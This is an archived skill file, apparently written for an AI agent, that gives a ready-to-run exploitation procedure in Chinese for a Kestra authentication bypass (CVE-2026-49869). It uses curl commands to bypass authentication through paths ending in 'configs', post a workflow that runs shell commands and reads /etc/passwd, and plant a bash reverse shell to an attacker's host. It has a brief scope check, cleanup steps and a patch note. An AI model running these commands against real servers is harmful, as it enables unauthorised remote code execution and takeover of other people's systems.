<!-- archived from /root/.hermes/skills/security/kestra-unauth-rce/SKILL.md on 2026-10-21 -->

---
name: kestra-unauth-rce
description: >-
  Kestra OSS CVE-2026-49869：AuthenticationFilter endsWith("/configs") 白名单后缀匹配绕过
  → 未授权创建并执行任意 workflow → RCE。影响 <1.0.45 / <1.3.21。
  CVSS 10.0 CRITICAL，在野利用，exploit 可用。KEV 2026-09-02。
  用户提到 Kestra / CVE-2026-49869 / workflow orchestration RCE / /api/v1/flows 时使用。
---

> 归档卡：原目录 `/root/.hermes/skills/security/kestra-unauth-rce`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/kestra-unauth-rce/…')`，不要相对 `references/legacy/` 解析。

# Kestra OSS 未授权 RCE — CVE-2026-49869

## 漏洞摘要

| 字段 | 值 |
|------|----|
| CVE | CVE-2026-49869 |
| CVSS | 10.0 CRITICAL |
| CWE | CWE-78 / CWE-184 / CWE-287 / CWE-918 |
| 修复版本 | 1.0.45 / 1.3.21 |
| 在野利用 | ✅ |
| Exploit 可用 | ✅ |

**根因**：`AuthenticationFilter` 对 `/configs` 路径做白名单时使用 `endsWith("/configs")`，而非精确路径匹配。任意以 `configs` 结尾的 API 路径（如 `/api/v1/flows/anythingconfigs`）均绕过 Basic Auth，攻击者可无需凭证调用完整 API。

## 授权检查

```bash
python3 tools/ops/scope_expand.py in_scope <target>
```

## 强制步骤

### Step 1 — 指纹确认

```bash
# 检查 Kestra 特征
curl -si https://<target>/ | grep -iE "kestra|x-kestra"
curl -si https://<target>/api/v1/flows/search?namespace=io.kestra | head -5
# 200 且返回 flows 数组 → 确认 Kestra
```

### Step 2 — 验证 auth bypass（仅指纹，不需要凭证）

```bash
# 正常 /configs 端点（公开，预期 200）
curl -si https://<target>/api/v1/configs

# 利用后缀绕过（路径末尾加 configs，应同样返回 200 而非 401）
curl -si "https://<target>/api/v1/flows/probeconfigs"
# 命中判定：返回 200/422（参数错误）而非 401/403
```

### Step 3 — 创建 Workflow（授权范围内执行）

```bash
# 通过绕过后缀路径 POST workflow YAML
curl -s -X POST "https://<target>/api/v1/flows/injectconfigs" \
  -H "Content-Type: application/x-yaml" \
  --data-binary @- <<'EOF'
id: se-probe-$(date +%s)
namespace: io.kestra.pentest
tasks:
  - id: whoami
    type: io.kestra.plugin.scripts.shell.Commands
    commands:
      - whoami
      - id
      - hostname
      - cat /etc/passwd | head -3
EOF
```

### Step 4 — 触发执行并读取结果

```bash
# 触发
EXEC=$(curl -s -X POST "https://<target>/api/v1/executions/io.kestra.pentest/se-probe-XXXXX" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

echo "Exec ID: $EXEC"

# 等待完成后查日志
sleep 5
curl -s "https://<target>/api/v1/executions/$EXEC/logs" \
  | python3 -c "import sys,json; [print(l.get('message','')) for l in json.load(sys.stdin)]"
```

### Step 5 — 清理（删除测试 workflow）

```bash
curl -s -X DELETE "https://<target>/api/v1/flows/io.kestra.pentest/se-probe-XXXXX"
```

## 深化利用（授权 L3，getshell）

```bash
# 反弹 shell workflow
cat > /tmp/kestra_revshell.yaml <<EOF
id: revshell
namespace: io.kestra.pentest
tasks:
  - id: shell
    type: io.kestra.plugin.scripts.shell.Commands
    commands:
      - bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
EOF

curl -s -X POST "https://<target>/api/v1/flows/injectconfigs" \
  -H "Content-Type: application/x-yaml" \
  --data-binary @/tmp/kestra_revshell.yaml

curl -s -X POST "https://<target>/api/v1/executions/io.kestra.pentest/revshell"
```

## 成功口径

- ✅ L1：`/api/v1/flows/probeconfigs` 返回非 401（auth bypass 确认）
- ✅ L2：workflow 执行 `id` 命令返回用户上下文
- ✅ L3：反弹 shell 回连

## Nuclei 模板

`tools/1day-kit/custom-templates/kestra-unauth-rce.yaml`

## 版本判断

```bash
curl -s https://<target>/api/v1/configs | python3 -m json.tool | grep -i version
```

< 1.0.45 或 < 1.3.21 → 漏洞版本

## 修复建议

升级至 Kestra 1.0.45（LTS）或 1.3.21+。临时缓解：在反向代理层对 `/api/` 添加 IP 白名单。
